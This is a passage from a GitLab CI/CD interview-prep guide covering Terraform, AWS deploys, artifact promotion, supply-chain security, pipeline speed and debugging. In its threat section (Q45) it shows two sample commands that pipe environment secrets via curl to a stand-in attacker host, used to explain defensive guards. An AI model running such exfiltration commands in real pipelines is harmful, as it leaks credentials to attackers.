**Interview answer:** "I build with BuildKit, using registry-backed layer cache, tag the image with the commit SHA, push it, and pass the digest to later jobs through a dotenv report so deployments reference the exact bytes that were tested. I avoid latest, add semver tags on releases, and prefer rootless builders over privileged Docker-in-Docker on shared runners."

**Follow-ups:**
- *Pushing to ECR?* Get credentials via OIDC (Q39), then `aws ecr get-login-password | docker login --username AWS --password-stdin <account>.dkr.ecr.<region>.amazonaws.com`.

---

### Q41. How do you run Terraform safely in GitLab?

**Short answer:** Split it into **plan** and **apply**. In the merge request, run `terraform plan -out=plan.tfplan` with a **read-only** role and show the plan for review. After merge, **apply that saved plan file** (exactly what was reviewed) with a write role, as a manual, protected job. Use remote state with locking, `resource_group` so only one apply runs at a time, and policy checks on the plan.

**How it works:**
1. `plan` job: `init`, `plan -out`, and `show -json` for policy tools; the plan file is an artifact.
2. Reviewers read the plan in the MR ("3 to add, 1 to change, 0 to destroy").
3. `apply` job on `main`: downloads the plan artifact and runs `terraform apply plan.tfplan`. If the state changed since the plan, Terraform refuses the stale plan.
4. `resource_group` and state locking stop overlapping runs.

**Example:**
```yaml
.tf:
  image:
    name: hashicorp/terraform:1.13.0
    entrypoint: [""]
  before_script: [terraform init -input=false]
  resource_group: tf-prod

plan:
  extends: .tf
  stage: plan
  script:
    - terraform plan -input=false -out=plan.tfplan
    - terraform show -json plan.tfplan > plan.json
  artifacts:
    paths: [plan.tfplan, plan.json]
    expire_in: 1 day

apply:
  extends: .tf
  stage: apply
  needs: [plan]
  script: terraform apply -input=false plan.tfplan
  environment: production
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      when: manual
```

```flow
pipeline: Terraform from merge request to production
stage: Merge request pipeline
plan with a read-only role > terraform plan writes plan.tfplan, which says 3 to add, 1 to change, 0 to destroy.
Policy checks on plan.json > A tool like OPA or Checkov rejects risky changes such as a public S3 bucket.
Human review > Reviewers read the plan output in the merge request before approving.
stage: Main branch pipeline
plan again on main > The plan is regenerated from the merged code and saved as an artifact.
Manual apply of the saved plan > apply plan.tfplan changes exactly what the plan showed, under resource_group tf-prod and the state lock.
```

**What happens, step by step:**
1. MR pipeline: `plan` shows `+ aws_s3_bucket.reports`, `~ aws_ecs_service.api (desired_count 2 → 3)`. A policy check passes; a reviewer approves.
2. Merge: the `main` pipeline re-plans from the merged code (same result unless `main` moved) and saves `plan.tfplan`.
3. A release manager runs `apply`; it applies that exact file. If someone changed the infrastructure in between, Terraform reports the plan is stale and nothing is applied.
4. A second pipeline's `apply` waits for `tf-prod` instead of racing on the state.

**Common mistake → fix:** `terraform apply -auto-approve` in the apply job without a saved plan; it computes a **new** plan at apply time that nobody reviewed, possibly including a destroy. Fix: apply the saved plan artifact, and give the plan job a read-only role.

**Interview answer:** "Plan in the MR with a read-only role, show the plan and run policy checks on its JSON, then after merge apply the saved plan file with a separate write role in a manual, protected job. Remote state with locking plus a resource_group prevents concurrent applies, and providers are pinned through the lock file. That way what gets applied is exactly what was reviewed."

**Follow-ups:**
- *Where does state live?* A remote backend with locking: S3 (with native lock files) or GitLab-managed Terraform state over the HTTP backend.
- *Is the plan file sensitive?* Yes, it can contain secret values; keep artifact expiry short and restrict access.

---

### Q42. Deploying to ECS, Lambda and S3 with CloudFront

**Short answer:** The pipeline should deploy an artifact built earlier, then **wait and verify**. For **Amazon ECS** (containers): register a new task definition revision with the new image digest, update the service, and wait until it's stable; the deployment circuit breaker rolls back failures. For **AWS Lambda**: publish a new version and shift an alias gradually (canary) with alarms. For a static site on **S3 + CloudFront**: upload hashed assets, then `index.html`, then invalidate the cache.

**How it works:**

| Target | Deploy steps | Rollback |
|---|---|---|
| ECS | new task definition revision → `update-service` → `aws ecs wait services-stable` | circuit breaker auto-rollback, or point the service at the previous revision |
| Lambda | `publish-version` → shift alias `live` (e.g. 10% then 100% via CodeDeploy) | move the alias back |
| S3 + CloudFront | sync `assets/` (long cache) → upload `index.html` (no cache) → invalidate `/index.html` | re-upload the previous `index.html` |

**Example (ECS):**
```yaml
deploy-ecs:
  stage: deploy
  needs: [build-image]                      # provides IMAGE_DIGEST via dotenv
  script:
    - aws ecs describe-task-definition --task-definition api --query taskDefinition > td.json
    - jq --arg IMG "$CI_REGISTRY_IMAGE/api@$IMAGE_DIGEST"
        '.containerDefinitions[0].image=$IMG | del(.taskDefinitionArn,.revision,.status,.requiresAttributes,.compatibilities,.registeredAt,.registeredBy)'
        td.json > new-td.json
    - REV=$(aws ecs register-task-definition --cli-input-json file://new-td.json --query taskDefinition.taskDefinitionArn --output text)
    - aws ecs update-service --cluster prod --service api --task-definition "$REV"
    - aws ecs wait services-stable --cluster prod --services api
  environment: production
```

**What happens, step by step:**
1. The current task definition is `api:41`. The job copies it, swaps the image for `…/api@sha256:ab12…`, and registers `api:42`.
2. `update-service` starts a rolling deployment: new tasks start, pass health checks, then old tasks drain.
3. `wait services-stable` polls until the deployment completes (or times out). If tasks keep failing health checks, the circuit breaker rolls back to `api:41` and the job fails, so the pipeline shows the failure.
4. The GitLab environment records `api:42` as deployed by this pipeline.

**Common mistake → fix:** `aws ecs update-service --force-new-deployment` with an image tag like `:latest` and no wait. The job is green within seconds whatever happens afterwards, and nobody knows which image is running. Fix: a new task definition with a digest, and wait for stability so the pipeline result reflects reality.

**Interview answer:** "For ECS I register a new task definition revision pointing at the image digest, update the service, and wait for steady state, with the circuit breaker for automatic rollback. For Lambda I publish a version and shift an alias gradually with alarms. For an S3 and CloudFront site I upload hashed assets first, then index.html, then invalidate. In every case the job waits for the outcome, so the pipeline status means the deploy actually worked."

**Follow-ups:**
- *Why upload `index.html` last?* It references the new hashed asset files; uploading it first could serve HTML pointing at files that don't exist yet.

---

### Q43. What makes a deployment atomic and easy to roll back?

**Short answer:** Deploy **immutable artifacts** (an image digest or a versioned bundle) by **pointing** the environment at them, rather than rebuilding or editing in place. Then a rollback is just pointing back at the previous artifact, which still exists. Add health checks and alarms that decide success automatically, and make database changes **backward-compatible** so the old version can still run after a migration.

**How it works:**
1. Build produces `api@sha256:ab12…`. It's never modified.
2. Deploy switches traffic to it (new ECS task definition revision, Lambda alias, Kubernetes image field).
3. Health checks and alarms watch for a few minutes; on failure the platform or pipeline switches back automatically.
4. Database migrations follow **expand → migrate → contract**: add new columns first (old code ignores them), switch code, remove old columns only in a later release.

**Example:** release 1.5 renames `customer.phone` to `customer.mobile`.
- Release 1.5: add `mobile`, write to both columns, read `mobile` falling back to `phone`.
- Release 1.6 (after 1.5 is stable): backfill complete, read only `mobile`.
- Release 1.7: drop `phone`.

**What happens, step by step:**
1. 1.5 deploys and errors spike for an unrelated reason. Rollback to 1.4 works, because 1.4 still finds `phone` (it was never removed).
2. Had 1.5 renamed the column directly, 1.4 would crash on rollback: the "easy rollback" would be impossible.
3. Each release is a reference switch, so rollback takes as long as the switch (seconds to minutes), not a rebuild.

**Common mistake → fix:** a "rollback" that rebuilds the old commit. Base images and dependencies may have changed, so you deploy something never tested. Fix: keep previous artifacts in the registry and redeploy them by digest.

**Interview answer:** "Atomic deployments switch a pointer to an immutable artifact; rollback switches it back to the previous artifact, which still exists. Health checks and alarms decide success automatically, and database changes use expand-migrate-contract so the previous version keeps working after a migration. I never rebuild during deploy or rollback."

**Follow-ups:**
- *Blue/green vs canary?* Blue/green switches all traffic between two full environments; canary moves a small percentage first and grows it while metrics stay healthy.

---

### Q44. Build once, deploy many: how do you promote an artifact?

**Short answer:** Build the artifact **once** on `main`, push it to a registry, and deploy **the same digest** to dev, then staging, then production, changing only configuration (environment variables, secrets, scaling) per environment. Never rebuild for production: a rebuild can produce different bytes, and then what you tested isn't what you ship.

**How it works:**
1. The `build` job pushes `api@sha256:ab12…` and exports the digest (dotenv report).
2. Each deploy job `needs` the build and deploys that digest with environment-specific configuration.
3. Gates between environments: automated tests after dev, evaluations and load tests after staging, manual approval for production.

**Example:**
```yaml
stages: [build, dev, staging, production]
build:          { stage: build, script: ./build.sh, artifacts: { reports: { dotenv: build.env } } }
deploy-dev:     { stage: dev,        needs: [build], environment: dev,        script: ./deploy.sh dev "$IMAGE_DIGEST" }
deploy-staging: { stage: staging,    needs: [build, deploy-dev], environment: staging, script: ./deploy.sh staging "$IMAGE_DIGEST" }
deploy-prod:
  stage: production
  needs: [build, deploy-staging]
  environment: production
  script: ./deploy.sh production "$IMAGE_DIGEST"
  rules: [{ if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH, when: manual }]
```

```flow
trace: One digest promoted through three environments
build on main: api@sha256:**ab12** pushed > The image is built exactly once. Its digest is passed to later jobs.
dev: deploys **ab12**, smoke tests pass > Configuration comes from dev-scoped variables.
staging: deploys **ab12**, load test passes > Same bytes, different configuration and scale.
production: deploys **ab12** after approval > What runs in production is exactly what passed in dev and staging.
```

**What happens, step by step:**
1. `build` pushes the image and `build.env` holds `IMAGE_DIGEST=sha256:ab12…`.
2. `deploy-dev` gets `IMAGE_DIGEST` from the dotenv report (because it `needs: [build]`) and deploys it with dev settings.
3. `deploy-staging` deploys the same digest after dev succeeds.
4. `deploy-prod`, after approval, deploys `sha256:ab12…` again. The production environment page shows the same digest staging had.

**Common mistake → fix:** environment-specific builds (`npm run build:prod` with API URLs baked into the bundle). You now have three different artifacts and test only two of them. Fix: inject configuration at deploy or runtime (environment variables, a config file loaded at startup) so one artifact works everywhere.

**Interview answer:** "I build once on main, push to a registry and pass the digest to every deploy job, so dev, staging and production run identical bytes and only configuration differs. Gates between environments are tests, evaluations and approvals. Rebuilding per environment breaks the guarantee that what we tested is what we ship."

**Follow-ups:**
- *What about frontend apps that need config at build time?* Load a small runtime config (e.g. `/config.json`) at startup instead of baking values into the bundle.

---
## 7. Security & supply chain

### Q45. How can a CI/CD pipeline become an attack path?

**Short answer:** A pipeline runs code from the repository with access to secrets, cloud credentials and production. So anyone who can change that code, its dependencies or the runner can try to steal secrets or ship malicious builds. The main paths are: a malicious change to `.gitlab-ci.yml` in a branch, a compromised dependency or image, shared runners leaking between projects, over-privileged long-lived credentials, and tampered artifacts. Each has a specific guard.

**How it works:**

| Attack path | Example | Guard |
|---|---|---|
| Pipeline edited in a branch | MR adds `curl -d "$AWS_SECRET_ACCESS_KEY" https://evil.example` | protected variables (not given to unprotected branches); fork MR pipelines get no project secrets |
| Compromised dependency or image | a typo-squatted npm package runs a post-install script | lockfiles, pinned versions and image digests, dependency scanning |
| Shared runner abuse | job on a shared shell runner reads another project's build dir | container executors, ephemeral runners, protected runners for deploys |
| Long-lived cloud keys | leaked access key works for months | OIDC with branch-scoped trust (Q39) |
| Tampered artifacts | image swapped in the registry | signing and verification before deploy (Q48) |

**Example:** a contributor opens an MR that changes the test job to `env | curl -X POST --data-binary @- https://evil.example`.

**What happens, step by step (with guards in place):**
1. The MR pipeline runs on an unprotected branch. Protected variables (deploy keys, `PROD_DB_PASSWORD`) are not injected, so `env` contains only non-sensitive values.
2. The job runs on a shared, ephemeral runner, not the protected production runner, so there's no network path to production.
3. AWS access uses OIDC with trust limited to `ref:main`, so even a token minted for this branch can't assume the deploy role.
4. Code owners must approve changes to `.gitlab-ci.yml`, so the malicious change can't reach `main`.

**Common mistake → fix:** storing a production cloud key as an **unprotected** variable "because the MR pipeline needs it for integration tests". Any branch can now read it. Fix: separate, least-privilege credentials for MR pipelines (or a sandbox account), protected variables for production, and OIDC everywhere possible.

**Interview answer:** "The pipeline is privileged code execution, so the threats are malicious pipeline edits, compromised dependencies and images, shared runner leakage, long-lived credentials and tampered artifacts. I counter them with protected variables and runners, no secrets for fork pipelines, code owners on CI config, pinned dependencies and digests, scanning, OIDC with tight trust conditions, and signed artifacts verified before deploy."

**Follow-ups:**
- *What's `CI_JOB_TOKEN` and its risk?* A short-lived token for the job to access GitLab APIs and other projects; limit its scope with the project's job token allowlist.

---

### Q46. What security scans belong in a pipeline?

**Short answer:** Different scanners find different problems: **SAST** (static application security testing) reads your source code for insecure patterns; **secret detection** finds leaked keys; **dependency scanning** finds known-vulnerable libraries; **container scanning** finds vulnerable OS packages in your image; **IaC scanning** finds risky infrastructure config (e.g. a public S3 bucket); **DAST** (dynamic testing) attacks the running app. GitLab provides templates for these, and **security policies** let a security team enforce them so projects can't quietly remove them.

**How it works:**

| Scan | Finds | Runs against |
|---|---|---|
| SAST | SQL injection patterns, unsafe deserialisation | source code |
| Secret detection (+ push protection) | API keys, tokens in commits | commits; push protection blocks the push itself |
| Dependency scanning | libraries with known CVEs (published vulnerabilities) | lockfiles |
| Container scanning | vulnerable OS and language packages | built image |
| IaC scanning | open security groups, unencrypted storage | Terraform, Kubernetes, CloudFormation files |
| DAST | XSS, missing headers, auth issues | a deployed (review or staging) app |

**Example:**
```yaml
include:
  - template: Jobs/SAST.gitlab-ci.yml
  - template: Jobs/Secret-Detection.gitlab-ci.yml
  - template: Jobs/Dependency-Scanning.gitlab-ci.yml
  - template: Jobs/Container-Scanning.gitlab-ci.yml

container_scanning:
  variables:
    CS_IMAGE: $CI_REGISTRY_IMAGE/api:$CI_COMMIT_SHA
```

**What happens, step by step:**
1. The templates add scanner jobs to the `test` stage; each uploads a security report artifact.
2. Container scanning checks `api:3f2a9c1…` and reports, say, 1 critical vulnerability in `openssl`.
3. The MR security widget shows "1 critical, 3 medium (new in this MR)".
4. A merge request approval policy requires security team approval when new critical findings appear, so the MR can't merge until the base image is updated or the finding is triaged.

**Common mistake → fix:** running scanners with `allow_failure: true` and never looking at results; findings accumulate unseen. Fix: surface new findings in the MR, block on criticals via approval policies, and triage the backlog with owners.

**Interview answer:** "I layer SAST, secret detection with push protection, dependency scanning, container scanning, IaC scanning, and DAST against a review or staging environment. Results show up in the MR as new findings, and security policies enforce the scans and require approval for new critical issues, so teams can't silently drop them."

**Follow-ups:**
- *Why is secret detection after the commit too late?* Once pushed, the secret is in history; push protection blocks it before it reaches the server.

---

### Q47. How do you keep secrets out of logs, artifacts and images?

**Short answer:** Prefer **no stored secrets**: OIDC for cloud access and runtime fetch from a secrets manager. For secrets that must exist as variables, use masked, hidden, protected, environment-scoped variables. Then avoid the common leaks: shell tracing (`set -x`) that prints commands with values, secrets written into artifacts, and secrets baked into Docker image layers. If anything leaks, **rotate** it.

**How it works:**
- `set -x` prints every command after variable expansion; masking catches the exact string but not transformed values.
- Artifacts are downloadable by people with access to the pipeline.
- `ARG`/`ENV`/`COPY` of a secret in a Dockerfile stores it in an image layer forever; BuildKit **secret mounts** make the secret available only during one `RUN` step, never stored.

**Example:**
```dockerfile
# syntax=docker/dockerfile:1
FROM python:3.13-slim
RUN --mount=type=secret,id=pip_token \
    PIP_INDEX_URL="https://__token__:$(cat /run/secrets/pip_token)@pypi.example.com/simple" \
    pip install -r requirements.txt
```
```yaml
build-image:
  script:
    - docker buildx build --secret id=pip_token,env=PIP_TOKEN -t $IMAGE:$CI_COMMIT_SHA --push .
```

**What happens, step by step:**
1. `PIP_TOKEN` is a masked, protected variable in the job.
2. `--secret id=pip_token,env=PIP_TOKEN` hands it to BuildKit, which mounts it at `/run/secrets/pip_token` only during that `RUN`.
3. pip installs private packages; the layer stores the installed packages but not the token.
4. `docker history` or extracting the image shows no token. With `ARG PIP_TOKEN` instead, the value would appear in the image metadata and history.

**Common mistake → fix:** debugging a deploy script with `set -x` while it handles a token; the log prints `curl -H 'Authorization: Bearer eyJ…'` (masking may catch it, but a base64 or URL-encoded form won't be). Fix: no tracing around secrets, and rotate anything that appeared in a log.

**Interview answer:** "First, avoid stored secrets with OIDC and runtime fetches from a secrets manager. When variables are unavoidable they're masked, hidden, protected and environment-scoped. I never trace commands around secrets, never write them into artifacts, and use BuildKit secret mounts so they don't end up in image layers. Any exposure means rotation, not just deleting the log."

**Follow-ups:**
- *Can you delete a job log?* Maintainers can erase a job's log and artifacts, but assume the secret was already seen and rotate it.

---

### Q48. Signing, SBOMs and provenance

**Short answer:** Supply-chain controls let production prove **what** it's running and **where it came from**. An **SBOM** (software bill of materials) lists every package in the image. **Signing** (e.g. Cosign with Sigstore, using the job's OIDC identity, so no signing key to manage) proves the image was produced by your pipeline. **Provenance attestations** record which commit, pipeline and builder produced it. At deploy time, a policy **verifies** the signature and rejects anything unsigned.

**How it works:**
1. Build and push the image; note its digest.
2. Generate an SBOM (Syft, CycloneDX) and attach it as an attestation.
3. `cosign sign` with a GitLab ID token whose audience is `sigstore`: Sigstore issues a short-lived certificate bound to the job's identity (project, ref), and the signature is recorded in a public transparency log.
4. The cluster or deploy job runs `cosign verify` with the expected identity before deploying.

**Example:**
```yaml
sign-image:
  image: cgr.dev/chainguard/cosign:latest
  needs: [build-image]
  id_tokens:
    SIGSTORE_ID_TOKEN:
      aud: sigstore
  script:
    - cosign sign --yes "$CI_REGISTRY_IMAGE/api@$IMAGE_DIGEST"
```
Verification before deploy:
```bash
cosign verify "$CI_REGISTRY_IMAGE/api@$IMAGE_DIGEST" \
  --certificate-identity "https://gitlab.example.com/shop/api//.gitlab-ci.yml@refs/heads/main" \
  --certificate-oidc-issuer "https://gitlab.example.com"
```

**What happens, step by step:**
1. `sign-image` gets a Sigstore-audience token and signs `api@sha256:ab12…`; the signature is stored next to the image in the registry.
2. The deploy step verifies: the signature must come from the `shop/api` pipeline definition on `main`, issued by your GitLab.
3. Someone pushes a hand-built image to the same repository. It has no valid signature, so verification fails and the deploy stops.

**Common mistake → fix:** signing images but never verifying them. Signing alone changes nothing. Fix: enforce verification at the point of deployment (deploy job or a Kubernetes admission policy) with the exact expected identity.

**Interview answer:** "I generate an SBOM for each image, sign it keylessly with Cosign using the job's OIDC identity, and attach provenance about the commit and pipeline. The important part is verification: deploys or admission policies check the signature and the signer identity, so only images built by our protected pipeline on main can run in production."

**Follow-ups:**
- *Why keyless?* There's no long-lived signing key to protect or rotate; the identity comes from the CI job's OIDC token.

---

### Q49. How do you protect the pipeline definition itself?

**Short answer:** Since the pipeline is code that controls deployments, protect it like production code: **protected branches** so changes reach `main` only via MRs, **code owners** for `.gitlab-ci.yml` and `ci/` so the platform or security team must approve changes, includes and components **pinned to versions**, and for organisation-wide requirements, **pipeline execution policies** or **scan execution policies** that inject mandatory jobs teams can't remove.

**How it works:**
- `CODEOWNERS`: `/.gitlab-ci.yml @platform-team` and `/ci/ @platform-team`, with "require code owner approval" on the protected branch.
- Pinned includes: `ref: v3.2.0` instead of `ref: main`, so a template change can't silently alter every pipeline.
- Security policies live in a separate security policy project and apply to many projects.

**Example:**
```
# CODEOWNERS
/.gitlab-ci.yml   @platform-team
/ci/              @platform-team
/terraform/       @platform-team @security-team
```

**What happens, step by step:**
1. A developer's MR removes the `container_scanning` job to speed up the pipeline.
2. Because `.gitlab-ci.yml` changed, GitLab requires approval from `@platform-team`; the MR is blocked.
3. Even if it were approved, a scan execution policy injects container scanning into every pipeline of this project, so the scan still runs.

**Common mistake → fix:** includes from a central repo at `ref: main`; a broken commit there breaks hundreds of pipelines at once, and anyone with write access to that repo can change everyone's deploy logic. Fix: version the templates (or use components), pin consumers, protect the template repo too.

**Interview answer:** "I treat the pipeline as privileged code: protected branches, code owners with required approval on .gitlab-ci.yml and the ci folder, versions pinned for includes and components, and security policies to inject mandatory scans and jobs that projects can't delete. The shared template repositories get the same protection."

**Follow-ups:**
- *Pipeline execution policy vs scan execution policy?* Scan execution policies enforce GitLab security scans; pipeline execution policies can inject arbitrary required jobs (e.g. compliance checks).

---

## 8. Performance & reliability

### Q50. How do you make a slow pipeline faster?

**Short answer:** **Measure first**: find the slowest jobs and the time jobs spend waiting for runners. Then fix the biggest item: remove stage barriers with `needs`, skip unaffected work with `rules:changes`, cache dependencies keyed by lockfile, cache Docker layers in the registry, use smaller images, split tests with `parallel`, put fast checks first, auto-cancel outdated pipelines, and add runner capacity if jobs are queueing.

**How it works (in order of usual payoff):**
1. **Queue time** (pending jobs) → more or autoscaled runners.
2. **Critical path** (longest chain of dependent jobs) → `needs`, split the longest job.
3. **Setup time** (install, image pull) → cache, smaller or pre-built images.
4. **Wasted work** → `rules:changes`, `interruptible` + auto-cancel.

**Example:** a 28-minute MR pipeline: `install` 4 min → `build` 6 min → `test` 14 min (one job) → `docker` 4 min.

**What happens, step by step:**
1. Cache `.npm/` keyed by `package-lock.json`: `install` drops to 1 minute when the lockfile hasn't changed.
2. `parallel: 4` on tests with a splitter: 14 minutes becomes about 4.
3. Registry layer cache for the Docker build: 4 minutes becomes 1.
4. `needs` lets `lint` run immediately and `docker` start right after `build` instead of after tests.
5. Result: the critical path becomes about 1 + 6 + 4 = 11 minutes, with lint feedback in under 2 minutes (numbers illustrative).

**Common mistake → fix:** throwing bigger runners at everything before measuring. If jobs are queued, CPU size doesn't help; if a job spends 3 minutes downloading dependencies, caching helps more. Fix: look at the pipeline's job durations and pending times first, then optimise the critical path.

**Interview answer:** "I measure first: queue time versus run time, and the critical path. Then needs to remove stage barriers, rules:changes to skip unaffected work, lockfile-keyed caches and registry layer caching, smaller images, parallel test splitting, fast checks first, and auto-cancel of outdated pipelines. If jobs sit in pending, the fix is runner capacity, not faster scripts."

**Follow-ups:**
- *What's a good target?* Feedback on an MR in under about 10 minutes keeps developers in flow; longer pipelines get batched and ignored.

---

### Q51. How do you deal with flaky tests?

**Short answer:** A **flaky test** passes and fails on the same code. Flaky tests teach people to click "retry" and ignore red pipelines, which eventually hides real bugs. Detect them from test report history, **quarantine** each one (move it to a non-blocking job) with an owner and a deadline, fix the root cause (timing, shared state, order dependence, external services), and retry only **infrastructure** failures automatically.

**How it works:**
1. JUnit reports uploaded as artifacts let GitLab show test history; a test that failed and then passed on retry for the same commit is a flake candidate.
2. Quarantine: tag the test (e.g. `@pytest.mark.quarantine`) and run quarantined tests in a separate `allow_failure: true` job, so the signal is kept but doesn't block.
3. Common root causes: fixed `sleep()` waiting for async work, tests sharing database rows, dependence on test order, real network calls, time zones and "now".

**Example:**
```yaml
unit-tests:
  script: pytest -m "not quarantine" --junitxml=report.xml
  artifacts: { reports: { junit: report.xml } }

quarantined-tests:
  script: pytest -m quarantine --junitxml=quarantine.xml
  allow_failure: true
  artifacts: { reports: { junit: quarantine.xml } }
```

**What happens, step by step:**
1. `test_order_confirmation_email` fails about 1 in 20 runs. It waits `sleep(1)` for a background job that sometimes takes 1.3 seconds.
2. It's marked `quarantine`, with an issue assigned to its owner, due in a week. `unit-tests` stays blocking and reliable.
3. The fix replaces the sleep with polling until the email appears (with a timeout). After 50 green runs it leaves quarantine.

**Common mistake → fix:** `retry: 2` on the whole test job. Flakes vanish from view, real intermittent bugs (race conditions in your code) ship. Fix: retry only infrastructure failure reasons (Q32) and quarantine individual tests.

**Interview answer:** "Flaky tests destroy trust in CI, so I detect them from test report history, quarantine each to a non-blocking job with an owner and deadline, and fix root causes like sleeps, shared state or real network calls. Automatic retries are only for infrastructure failures; retrying test failures just hides real race conditions."

**Follow-ups:**
- *How do you make DB tests deterministic?* A fresh database per job (a service container), unique data per test, and transactions rolled back after each test.

---

### Q52. How close should the CI environment be to production?

**Short answer:** Close enough that "passes in CI" predicts "works in production". Use the **same base image and runtime versions**, the **same build artifact**, real dependencies started as containers (Postgres, Redis) instead of mocks where it matters, and cloud emulators or a sandbox cloud account for integration tests. Accept the gaps you can't close (scale, real IAM, networking) and cover them with smoke tests in staging.

**How it works:**

| Area | Parity approach |
|---|---|
| Runtime | test inside the image you'll ship (or the same base image and versions) |
| Dependencies | `services:` with the same major versions as production (e.g. `postgres:17`) |
| Cloud APIs | emulators for fast tests; a sandbox account for integration tests |
| Configuration | same config mechanism, different values |
| Not replicable | scale, real IAM policies, network paths → staging smoke and load tests |

**Example:** production runs PostgreSQL 17; CI used SQLite "for speed". A query using `ON CONFLICT … DO UPDATE` with a PostgreSQL-specific JSON operator passes in CI and fails in production.

**What happens, step by step:**
1. Tests pass against SQLite, which accepted a simplified form of the query.
2. In production the query errors on the JSON operator SQLite never tested.
3. Switching CI to `services: [postgres:17]` adds about 10 seconds to the job and catches the error in the MR.

**Common mistake → fix:** mocking every external dependency, so CI only proves the code agrees with your mocks. Fix: keep unit tests with fakes for speed, and add a smaller integration suite against real containers or a sandbox environment.

**Interview answer:** "I aim for runtime parity by testing the image we ship, dependency parity with service containers at production versions, and cloud parity with emulators or a sandbox account. Gaps that can't be closed, like scale and real IAM, are covered by smoke and load tests in staging, and I document them."

**Follow-ups:**
- *Test the image or the source?* Ideally run at least the integration tests inside the built image, so packaging bugs (missing files, wrong entrypoint) are caught too.

---

## 9. Scenario & debugging questions

### Q53. Deployment works on `main` but fails in an MR pipeline. Why?

**Short answer:** Usually **by design**: credentials are restricted to protected branches. Protected variables aren't injected into unprotected branches, the OIDC trust policy may accept only `ref:main`, and MRs from forks get no project secrets. Check these in order, then fix the design: MR pipelines should test and plan with read-only credentials, not deploy to shared environments.

**Steps to diagnose:**
1. **Is the job even in the pipeline?** Check the MR pipeline's job list. If it's missing, the job's `rules` don't match `merge_request_event` (Q25).
2. **Are the variables empty?** Print non-secret indicators, e.g. `[ -n "$DEPLOY_TOKEN" ] && echo set || echo empty`. "empty" on the MR but "set" on `main` → the variable is **protected**.
3. **Does AWS say AccessDenied on AssumeRoleWithWebIdentity?** Decode the token's claims (not the signature) and compare `sub` with the trust policy. `ref:feature/x` vs a policy for `ref:main` → OIDC restriction.
4. **Is it a fork MR?** Pipelines for fork MRs run in the fork's context without the parent project's secrets.
5. **Different variable values?** In MR pipelines `CI_COMMIT_BRANCH` is not set (use `CI_MERGE_REQUEST_SOURCE_BRANCH_NAME`), which can break scripts that build names from it.

**Fix:** MR pipelines run tests and `terraform plan` with a read-only role whose trust policy allows MR refs; deployment to shared environments happens only from `main` (or review apps in a sandbox account with their own limited role).

**Common mistake → fix:** un-protecting the production variable or widening the trust policy to `ref:*` "to make the MR green". That hands production credentials to every branch. Fix: separate, least-privilege credentials per purpose.

**Interview answer:** "Most often it's working as intended: protected variables and OIDC trust conditions only apply to protected refs like main, and fork MRs get no secrets. I confirm the job is created, check whether variables are empty, decode the token's sub claim against the trust policy, and check for fork pipelines. The fix is a read-only role for MR plans and tests, not loosening production credentials."

**Follow-ups:**
- *Can MR pipelines ever get protected variables?* There's a setting that lets MR pipelines access protected variables in specific cases, but treat it carefully because the MR's code is untrusted until merged.

---

### Q54. Every push creates two pipelines. Why, and how do you fix it?

**Short answer:** With an open merge request, one push produces **two events**: a branch push (→ branch pipeline) and an MR update (→ merge request pipeline). If your jobs' rules match both, you get duplicate pipelines. Fix it in `workflow:rules`: run MR pipelines for MR events, and skip branch pipelines when an MR is open (`$CI_OPEN_MERGE_REQUESTS`).

**Steps to diagnose:**
1. Open the pipelines list: two pipelines for the same commit, one labelled **merge request** and one for the branch → it's this issue.
2. If both are branch pipelines, look for other sources: a webhook, a trigger job, or a schedule creating extra pipelines (`CI_PIPELINE_SOURCE` on each).

**Example fix:**
```yaml
workflow:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    - if: $CI_COMMIT_BRANCH && $CI_OPEN_MERGE_REQUESTS
      when: never
    - if: $CI_COMMIT_BRANCH
    - if: $CI_COMMIT_TAG
```

```flow
trace: One push to a branch that has an open merge request
push to feature/login with MR !42 open > GitLab receives two events: a branch push and a merge request update.
MR event: rule 1 matches > A merge request pipeline is created.
branch event: rule 2 matches, **when never** > CI_OPEN_MERGE_REQUESTS is set, so the branch pipeline is not created.
result: **one** pipeline > Runners do half the work and the merge request shows a single status.
```

**What happens, step by step:**
1. Push to `feature/login` (MR !42 open): MR pipeline created, branch pipeline skipped.
2. Push to `feature/other` with no MR: rule 1 doesn't match, rule 2 doesn't match (no open MR), rule 3 matches → branch pipeline.
3. Merge to `main`: branch pipeline on `main` (no MR is open from `main`).

**Common mistake → fix:** adding `workflow:rules` with only the MR rule; branch pipelines disappear entirely, including on `main`, so nothing deploys. Fix: keep rules for branches and tags as shown.

**Interview answer:** "With an open MR, a push creates both a branch event and an MR event, so you get a branch pipeline and an MR pipeline. I fix it with workflow:rules: create MR pipelines for merge_request_event, skip branch pipelines when CI_OPEN_MERGE_REQUESTS is set, and keep branch and tag pipelines otherwise. GitLab also ships a workflow template, MergeRequest-Pipelines, with this pattern."

**Follow-ups:**
- *Branch or MR pipelines: which should you prefer?* MR pipelines (ideally merged results) for review, branch pipelines for `main` and tags.

---

### Q55. A job is stuck in "pending". What do you check?

**Short answer:** "Pending" means GitLab created the job but **no runner has picked it up**. Either no available runner matches the job (tags, protected status, project assignment), all matching runners are busy, or the runners are offline. Check the job page's message first; it often states the reason, then the runner list.

**Steps to diagnose:**
1. **Read the job page.** A message like "This job is stuck because you don't have any active runners that can run this job" or "…with any of these tags: arm64" names the problem.
2. **Compare tags.** Job `tags: [arm64, gpu]` needs a runner with **both** tags. Settings → CI/CD → Runners lists each runner's tags.
3. **Check protection.** A runner marked **protected** only runs jobs from protected branches and tags; a feature-branch job will wait forever for it.
4. **Check "run untagged jobs".** A job with no tags needs a runner that accepts untagged jobs.
5. **Check runner status and capacity.** Offline (last contact long ago) → the runner process or VM is down. Online but busy → all `concurrent` slots in use; jobs are queued (look at pending time across many jobs).
6. **Check resource groups.** "Waiting for resource" is a different state: another job holds the `resource_group` (Q29).

**Example:** job `build-arm` has `tags: [arm64]`; the only arm64 runner is a protected project runner. On `main` it runs; on `feature/x` it stays pending.

**Fix:** register an unprotected arm64 runner for branch builds (or allow the job only on protected branches via `rules`); for capacity problems, raise `concurrent` or enable autoscaling.

**Common mistake → fix:** removing `tags` from the job to "make it run". It then runs on any generic runner, possibly the wrong architecture or without required access. Fix: fix the runner pool, not the job's requirements.

**Interview answer:** "Pending means no runner has taken the job. I read the stuck message on the job page, compare the job's tags with available runners, check whether the matching runner is protected or doesn't accept untagged jobs, then whether runners are online and have free concurrency. Waiting for resource is different: that's a resource_group lock."

**Follow-ups:**
